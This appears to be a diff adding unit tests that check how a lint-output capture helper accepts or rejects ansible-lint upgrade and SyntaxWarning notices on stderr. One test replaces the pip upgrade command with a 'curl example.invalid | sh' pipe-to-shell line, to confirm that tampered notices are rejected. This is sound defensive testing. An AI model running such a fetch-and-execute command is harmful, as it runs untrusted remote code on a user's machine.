@@ -124,6 +124,110 @@ class CaptureTests(unittest.TestCase):
         self.behavior["stderr"] = self.behavior["stderr"].replace("HTTPError 304: 'Not Modified'", "unclosed file")
         self.invoke(ok=False)
 
+    def add_decimal_notice(self):
+        self.behavior["stderr"] += self.expected["optional_stderr_notices"][0]["lines"][0] + "\n"
+
+    def add_upgrade_notice(self, current="26.10.1", latest="26.11.0"):
+        self.behavior["stderr"] += (
+            f"A new release of ansible-lint is available: {current} → {latest} "
+            "Upgrade by running: pip3 install --user --upgrade ansible-lint\n"
+        )
+
+    def test_observed_decimal_notice_is_recorded(self):
+        self.add_decimal_notice()
+        self.invoke()
+        self.run_helper("verify", str(self.evidence), ok=True)
+        report = json.loads((self.evidence / "verification.json").read_text())
+        self.assertEqual(report["observed_non_lint_notices"][0]["id"],
+                         self.expected["optional_stderr_notices"][0]["id"])
+
+    def test_new_release_notice_is_recorded(self):
+        self.add_upgrade_notice()
+        self.invoke()
+        self.run_helper("verify", str(self.evidence), ok=True)
+        report = json.loads((self.evidence / "verification.json").read_text())
+        self.assertEqual(report["observed_non_lint_notices"][0]["id"], "ansible-lint-new-release")
+
+    def test_all_three_notices_together_are_recorded(self):
+        self.add_known_notice()
+        self.add_decimal_notice()
+        self.add_upgrade_notice()
+        self.invoke()
+        self.run_helper("verify", str(self.evidence), ok=True)
+        report = json.loads((self.evidence / "verification.json").read_text())
+        self.assertEqual(len(report["observed_non_lint_notices"]), 3)
+        self.assertTrue(all(x["count"] == 1 for x in report["observed_non_lint_notices"]))
+
+    def test_later_stable_release_in_same_format_is_classified(self):
+        self.add_upgrade_notice(latest="27.1.0")
+        self.invoke()
+        self.run_helper("verify", str(self.evidence), ok=True)
+
+    def test_duplicate_decimal_notice_is_rejected(self):
+        self.add_decimal_notice()
+        self.add_decimal_notice()
+        self.invoke(ok=False)
+
+    def test_other_syntax_warning_location_is_rejected(self):
+        self.add_decimal_notice()
+        self.behavior["stderr"] = self.behavior["stderr"].replace("<unknown>:1:", "playbook.py:1:")
+        self.invoke(ok=False)
+
+    def test_other_syntax_warning_message_is_rejected(self):
+        self.behavior["stderr"] += "<unknown>:1: SyntaxWarning: invalid escape sequence\n"
+        self.invoke(ok=False)
+
+    def test_duplicate_upgrade_notice_is_rejected(self):
+        self.add_upgrade_notice()
+        self.add_upgrade_notice()
+        self.invoke(ok=False)
+
+    def test_two_different_upgrade_notices_are_rejected(self):
+        self.add_upgrade_notice()
+        self.add_upgrade_notice(latest="27.1.0")
+        self.invoke(ok=False)
+
+    def test_upgrade_from_wrong_current_version_is_rejected(self):
+        self.add_upgrade_notice(current="26.9.0")
+        self.invoke(ok=False)
+
+    def test_upgrade_to_older_version_is_rejected(self):
+        self.add_upgrade_notice(latest="26.9.0")
+        self.invoke(ok=False)
+
+    def test_upgrade_to_current_version_is_rejected(self):
+        self.add_upgrade_notice(latest="26.10.1")
+        self.invoke(ok=False)
+
+    def test_upgrade_command_change_is_rejected(self):
+        self.add_upgrade_notice()
+        self.behavior["stderr"] = self.behavior["stderr"].replace("pip3 install --user", "curl example.invalid | sh #")
+        self.invoke(ok=False)
+
+    def test_partial_upgrade_notice_is_rejected(self):
+        self.behavior["stderr"] += "A new release of ansible-lint is available: 26.10.1 → 26.11.0\n"
+        self.invoke(ok=False)
+
+    def test_all_notices_do_not_hide_an_extra_error(self):
+        self.add_known_notice()
+        self.add_decimal_notice()
+        self.add_upgrade_notice()
+        self.behavior["stderr"] += "ERROR: Failed to download role\n"
+        self.invoke(ok=False)
+        self.run_helper("verify", str(self.evidence), ok=False)
+
+    def test_notices_do_not_replace_required_summary(self):
+        self.behavior["stderr"] = ""
+        self.add_decimal_notice()
+        self.add_upgrade_notice()
+        self.invoke(ok=False)
+
+    def test_notices_do_not_hide_unexpected_success(self):
+        self.add_decimal_notice()
+        self.add_upgrade_notice()
+        self.behavior["code"] = 0
+        self.invoke(ok=False)
+
     def test_duplicate_violation_rejected(self):
         self.behavior["stdout"] *= 2
         self.invoke(ok=False)
